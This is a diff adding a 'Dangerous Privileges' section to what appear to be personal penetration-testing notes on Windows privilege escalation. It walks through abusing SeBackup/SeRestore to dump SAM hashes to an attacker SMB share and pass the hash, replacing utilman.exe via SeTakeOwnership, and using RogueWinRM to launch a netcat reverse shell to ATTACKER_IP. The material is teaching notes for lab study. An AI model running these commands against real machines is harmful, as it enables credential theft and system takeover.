@@ -461,6 +461,83 @@ accesschk64.exe -qlc Service
 Here we usually care for the `BUILTIN\Users` group, or any other to which our user is a part of, and of course the access `SERVICE_ALL_ACCESS` which means that we can reconfigure the service
 
 ## Dangerous Privileges
+Each account has privileges that allow it to perform specific system-related tasks. These tasks can be as  simple as the privilege to shut down the machine up to privileges to bypass some DACL-based access controls.
+Each user has a set of assigned privileges that can be checked with the following command in the command prompt when ran as administrator:
+```
+whoami /priv
+```
+A complete list of available privileges on Windows system can be found [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)  From an attacker's view, only those privileges that allow us to escalate in the system are of interest. For a comprehensive list of exploitable privileges refer to the [Priv2Admin](https://github.com/gtworek/Priv2Admin) github project.
+Here we shall go over some of the most common privileges.
+
+### SeBackup / SeRestore
+The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea being that this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges. 
+With this we can trivialize escalation on the system by using a variety of techniques. One of which consists on copying the SAM and SYSTEM registry hives to extract the local Administrator's passwords hash.
+To do this we can use the following commands:
+```
+reg save hklm\system C:\Path\Tosave\system.hive
+reg save hklm\sam C:\Path\Tosave\sam.hive
+```
+Which will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using [[SMB]] or any other available method. For SMB, we can use [[impacket]]'s `smbserver.py` to start a simple SMB server with a network share in the current directory of our attacking machine.
+```sh
+mkdir share
+
+python3.9 /opt/impacket/examples/smbserver.py -smb2support -username USER -password PASS public share
+```
+This will create a share named `public` to the `share` directory, which requires the username and password of our current windows session. After this, we can use the `copy` command on the windows machine to transfer both files to our AttackBox
+```
+copy C:\Path\Tosave\sam.hive \\AtacckerIP\public\
+copy C:\Path\Tosave\system.hive \\AtacckerIP\public\
+```
+And then use [[impacket]] to retrieve the user's password hashes
+```sh
+python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+```
+And finally we can use the Administrator or other user's hash to perform a Pass-the-Hash attack with [[impacket]] and gain access to the target machine.
+```sh
+python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 USER@IP
+```
+
+### SeTakeOwnership
+The SeTakeOwnership allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as System and take ownership of the service's executable. Another route is the one we are gonna cover however.
+
+We will abuse `utilman.exe` to escalate privileges this time. It is a built-in windows application used to provide Ease of Access options during the lock screen. Since utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file replacing it is trivial.
+To accomplish this, we will start by taking ownership with the following command
+```
+takeown /f C:\Windows\System32\Utilman.exe
+```
+Now we can grant us all the privileges over it
+```
+icacls C:\Windows\System32\Utilman.exe /grant USER:F
+```
+After this we can replace utilman.exe with a copy of cmd.exe
+```
+copy cmd.exe utilman.exe
+```
+To now trigger it, we can lock our screen from the start button, and when prompted with the login page, we can proceed to click on the "Ease of Access" button in the down-right corner.
+Note that when opening the cmd we may only be able to run built-in commands, but we can then try to use certain applications to gain some more footholding, read or even edit files. One example is running notepad.exe to read and edit .txt files.
+
+### SeImpersonate / SeAssignPrimaryToken
+These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.
+As attackers, if we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process.
+
+In Windows systems, we will find that the LOCAL SERVICE and NETWORK SERVICE ACCOUNTS already have such privileges. Since these accounts are used to spawn services using restricted accounts, it makes sense to allow them to impersonate connecting users if the service needs. **Internet Information Services** (IIS) will also create a similar default account called "iis apppool\\defaultapppool" for web applications.
+
+To elevate privileges using such accounts, we need the following: 
+1. To spawn a process so that users can connect and authenticate to it for impersonation to occur. 
+2. Find a way to force privileged users to connect and authenticate to the spawned malicious process.
+We can use [[RogueWinRM]] to accomplish both conditions. Assuming we already have compromised a website running on IIS and that a we have planted a webshell on that address. 
+We can use the webshell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest.
+To use [[RogueWinRM]], we first need to upload the exploit to the target machine. 
+
+The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network. Think of it like SSH, but using Powershell.
+If, for some reason, the WinRM service isn't running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting. If the attacker has SeImpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM.
+
+Before running the exploit, we'll start a netcat listener to receive a reverse shell. And then we can trigger the exploit using the following in the webshell
+```
+c:\RogueFolder\RogueWinRM.exe -p "C:\CatFolder\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
+```
+This will essentially execute the RogueWinRM.exe, starting a fake WinRM and impersonate the SYSTEM user, then executing nc64.exe (`-p`) and passing the arguments that it needs to spawn a shell and connect (`-a`)
+
 
 ## Vulnerable Software
 
